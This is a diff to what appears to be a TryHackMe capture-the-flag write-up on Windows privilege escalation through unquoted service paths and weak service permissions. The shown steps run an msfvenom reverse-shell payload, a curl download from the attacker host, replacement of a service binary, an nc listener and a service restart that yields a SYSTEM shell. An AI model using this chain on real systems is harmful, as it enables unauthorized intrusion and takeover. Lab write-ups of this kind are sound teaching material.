@@ -345,7 +345,7 @@ C:\PROGRA~2\SYSTEM~1>dir
                3 Dir(s)  14,755,926,016 bytes free
 ```
 
-12. `icacls <PAYLOAD> /grant EVERYONE:F` from the compromised Windows machine to grant full control (read and write permissions) to the "Everyone" group for our payload
+12. `icacls <PAYLOAD> /grant EVERYONE:F` from the compromised Windows machine to grant full control (read, write, and execute permissions) to the "Everyone" group for our payload
 ```PowerShell
 C:\PROGRA~2\SYSTEM~1>icacls WService.exe /grant Everyone:F
 processed file: WService.exe
@@ -410,7 +410,24 @@ THM{AT_YOUR_SERVICE}
 ### Unquoted Service Paths
 
 1. Started this task's machine
-2. `icacls <TARGET DIRECTORY>` from the compromised Windows machine to display the security permissions and ACLs (Access Control Lists) for our target directory, which is one of the directories where most of service executables are installed under by default (`C:\Program Files` or `C:\Program Files (x86)`)
+2. `sc qc <SERVICE>` from the comrpomised Windows machine to query the configuration of our target service, which was "disk sorter enterprise" because after executing this command, we saw that its `BINARY_PATH_NAME` had an unquoted service path, meaning that its associated executable wasn't properly quoted to account for spaces on the command
+```PowerShell
+C:\Users\thm-unpriv>sc qc "disk sorter enterprise"
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: disk sorter enterprise
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 0   IGNORE
+        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\Disk.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : Disk Sorter Enterprise
+        DEPENDENCIES       :
+        SERVICE_START_NAME : .\svcusr2
+```
+
+3. `icacls <TARGET DIRECTORY>` from the compromised Windows machine to display the security permissions and ACLs (Access Control Lists) for our target directory, which is one of the directories where most of service executables are installed under by default (`C:\Program Files` or `C:\Program Files (x86)`)
 ```PowerShell
 C:\Users\thm-unpriv>icacls c:\MyPrograms
 c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
@@ -423,7 +440,7 @@ c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
 Successfully processed 1 files; Failed processing 0 files
 ```
 
-3. `msfvenom -p <PAYLOAD> LHOST=<ATTACKER IP> LPORT=<PORT NUMBER> -f <PAYLOAD FORMAT> -o <OUTPUT FILE>` from our attack machine to generate a custom reverse shell payload executable (.exe)
+4. `msfvenom -p <PAYLOAD> LHOST=<ATTACKER IP> LPORT=<PORT NUMBER> -f <PAYLOAD FORMAT> -o <OUTPUT FILE>` from our attack machine to generate a custom reverse shell payload executable (.exe)
 ```Bash
 root@ip-10-10-6-207:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.6.207 LPORT=9999 -f exe-service -o ReverseShell.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -434,13 +451,13 @@ Final size of exe-service file: 48640 bytes
 Saved as: ReverseShell.exe
 ```
 
-4. `python3 -m <MODULE>` from our attack machine to start a simple HTTP server on our local machine using Python 3's built in HTTP server module (`http.server`)
+5. `python3 -m <MODULE>` from our attack machine to start a simple HTTP server on our local machine using Python 3's built in HTTP server module (`http.server`)
 ```Bash
 root@ip-10-10-6-207:~# python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 
-5. `curl <ATTACK MACHINE HTTP SERVER>:<PAYLOAD FILE PATH> -O <OUTPUT FILE>` from the compromised Windows machine to make an HTTP request to our previously set up Python server on our attack machine to download our previously generated reverse shell payload executable onto the compromised machine
+6. `curl <ATTACK MACHINE HTTP SERVER>:<PAYLOAD FILE PATH> -O <OUTPUT FILE>` from the compromised Windows machine to make an HTTP request to our previously set up Python server on our attack machine to download our previously generated reverse shell payload executable onto the compromised machine
 ```PowerShell
 C:\Users\thm-unpriv>curl http://10.10.6.207:8000/ReverseShell.exe -O ReverseShell.exe
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
@@ -449,26 +466,26 @@ C:\Users\thm-unpriv>curl http://10.10.6.207:8000/ReverseShell.exe -O ReverseShel
 curl: (6) Could not resolve host: ReverseShell.exe
 ```
 
-6. 
+7. `move <PAYLOAD> <BINARY_PATH_NAME EXECUTABLE>` from the compromised Windows machine to replace our target service's `BIANRY_PATH_NAME`'s executable file with our payload
 ```PowerShell
 C:\Users\thm-unpriv>move C:\Users\thm-unpriv\ReverseShell.exe C:\MyPrograms\Disk.exe
         1 file(s) moved.
 ```
 
-7. 
+8. `icacls <BINARY_PATH_NAME EXECUTABLE> /grant Everyone:F` from the compromised Windows machine to grant all users in the "Everyone" group full access (read, write, and execute) permissions to our payload
 ```PowerShell
 C:\Users\thm-unpriv>icacls C:\MyPrograms\Disk.exe /grant Everyone:F
 processed file: C:\MyPrograms\Disk.exe
 Successfully processed 1 files; Failed processing 0 files
 ```
 
-8. 
+9. `nc -lvnp <PORT NUMBER>` from our attack machine to open up a netcat listener that'll listen for any inbound connection
 ```Bash
 root@ip-10-10-6-207:~# nc -lvnp 9999
 Listening on [0.0.0.0] (family 0, port 9999)
 ```
 
-9.
+10. `sc stop <SERVICE>` from the compromised Windows machine to stop our target service
 ```Powershell
 C:\Users\thm-unpriv>sc stop "disk sorter enterprise"
 
@@ -481,7 +498,7 @@ SERVICE_NAME: disk sorter enterprise
         WAIT_HINT          : 0x0
 ```
 
-10.
+11. `sc start <SERVICE>` from the compromised Windows machine to start up our target service once again, but this time it'll end up executing our reverse shell payload that we used to replaced its original executable with and spawning a reverse shell that connected back to our netcat listener on our attack machine
 ```PowerShell
 C:\Users\thm-unpriv>sc start "disk sorter enterprise"
 
@@ -505,12 +522,15 @@ Microsoft Windows [Version 10.0.17763.1821]
 C:\Windows\system32>
 ```
 
-11. 
+12. `type <FILENAME>` from the reverse shell to display the contents of the file containing this task's flag
 ```PowerShell
 C:\Windows\system32>type C:\Users\svcusr2\Desktop\flag.txt
 type C:\Users\svcusr2\Desktop\flag.txt
 THM{QUOTES_EVERYWHERE}
 ```
+
+
+**TASK COMPLETED!**
 
 ### Insecure Service Permissions
 
